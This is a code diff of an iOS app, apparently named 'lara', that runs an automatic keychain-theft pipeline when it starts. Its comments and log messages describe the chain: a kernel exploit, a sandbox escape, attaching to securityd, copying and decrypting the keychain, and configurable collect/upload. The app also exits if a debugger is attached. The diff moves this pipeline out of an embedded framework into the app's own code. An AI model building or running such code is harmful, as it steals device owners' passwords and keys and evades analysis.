@@ -111,7 +111,7 @@ struct lara: App {
                         }
                     }
                 } else {
-                    Alertinator.shared.alert(title: "This device is not supported!", body: "We apologize, but this device is currently not supported by Lara. Possible reasons: \n- You are on an unsupported iOS version (Supported: iOS 16.0 - iOS 18.7.1, iOS 26.0 - iOS 26.0.1) \n- Your device has MIE (A19+ or M5+) \n- A debugger is attached.", actionLabel: "Exit App", action: { exitinator() })
+                    Alertinator.shared.alert(title: "This device is not supported!", body: "We apologize, but this device is currently not supported by Lara. Possible reasons: \n- You are on an unsupported iOS version (Supported: iOS 16.0 - iOS 18.7.1, iOS 26.0 and later) \n- Your device has MIE (A19+ or M5+) \n- A debugger is attached.", actionLabel: "Exit App", action: { exitinator() })
                 }
             }
             .onChange(of: scenephase, perform: handleScenePhase)
@@ -128,8 +128,9 @@ struct lara: App {
         case .inactive, .background:
             // A transient .inactive/.background (system alert, Control Center,
             // screen lock, respring) must not kill the auto keychain pipeline:
-            // handlebg() would destroy the SpringBoard RemoteCall the framework
-            // is using, and stopcapture() would stop logging. Let it finish.
+            // handlebg() would destroy the SpringBoard/securityd RemoteCalls the
+            // native pipeline is using, and stopcapture() would stop logging.
+            // Let it finish.
             if mgr.kcpipelineactive {
                 globallogger.log("(kc) scene \(phase) ignored: keychain pipeline in flight")
                 return
@@ -146,23 +147,20 @@ struct lara: App {
         }
     }
 
-    // Framework-only mode: the embedded libuiopsersvc.framework brings up its
-    // own kernel r/w (ds_run -> its own exploit + kernelcache fetch/parse).
-    // Its securityd copy path needs a ready SpringBoard RemoteCall — and that
-    // RemoteCall is the FRAMEWORK's class (RemoteCall.m is excluded from the
-    // lara target in project.pbxproj), so it checks the FRAMEWORK's ds state
-    // and must be built AFTER the framework's own ds_run(). That handoff now
-    // happens inside LaraKeychainSvc (prepareKernelRWWithError), so this entry
-    // point stays a plain handoff to the framework pipeline.
+    // Native pipeline mode: every stage is implemented in lara's own sources —
+    // darksword engine + XPF kernelcache parse (KCKernelCache), sbx_escape
+    // (KCSbx), keychain copy to /tmp/Acquisition-<UUID>/ (KCAcquisition),
+    // securityd RemoteCall + AKS unwrap (KCSecdRemote) and local decrypt/export
+    // (KCKeychain). No libuiopsersvc.framework is loaded or linked.
     private func autorunkeychainpipeline() {
-        globallogger.log("(kc) using embedded libuiopsersvc.framework (framework-only)")
+        globallogger.log("(kc) native pipeline (no libuiopsersvc)")
         globallogger.log("(kc) build-marker api-v1 (main-protocol gate + config-driven collect/upload)")
         prepareAndRunKeychainPipeline()
     }
 
-    // Drive the embedded framework end-to-end. The framework owns the whole
-    // pipeline: exploit -> kernelcache -> offsets -> remote attach -> keychain
-    // copy -> AKS unwrap. We only keep the process alive and guard the
+    // Drive the native pipeline end-to-end: exploit -> kernelcache -> XPF
+    // offsets -> sbx escape -> securityd attach -> keychain copy -> AKS unwrap
+    // -> decrypt/export. We only keep the process alive and guard the
     // scene-phase teardown while it runs.
     private func prepareAndRunKeychainPipeline() {
         let mgr = self.mgr
@@ -174,19 +172,18 @@ struct lara: App {
 
         do {
             try LaraKeychainSvc.ensureLoaded()
-            globallogger.log("(kc) libuiopsersvc loaded")
+            globallogger.log("(kc) native pipeline modules ready")
         } catch {
-            globallogger.log("(kc) libuiopsersvc load failed: \(error.localizedDescription)")
+            globallogger.log("(kc) native pipeline unavailable: \(error.localizedDescription)")
             mgr.kcpipelineactive = false
             return
         }
 
-        globallogger.log("(kc) running framework pipeline (exploit + copy + AKS unwrap)")
+        globallogger.log("(kc) running native pipeline (exploit + copy + AKS unwrap)")
 
-        // The framework's AKS decrypt path recurses deep into the keychain data
-        // (observed depth ~6600 frames, "Thread stack size exceeded due to
-        // excessive recursion" on a GCD worker). GCD workers only get a 512KB
-        // stack, so run the whole pipeline on a dedicated large-stack thread.
+        // The native securityd attach + decrypt can run long and deep; GCD
+        // workers only get a 512KB stack, so run the whole pipeline on a
+        // dedicated large-stack thread.
         let thread = Thread {
             var result: [AnyHashable: Any]?
             var failure: Error?
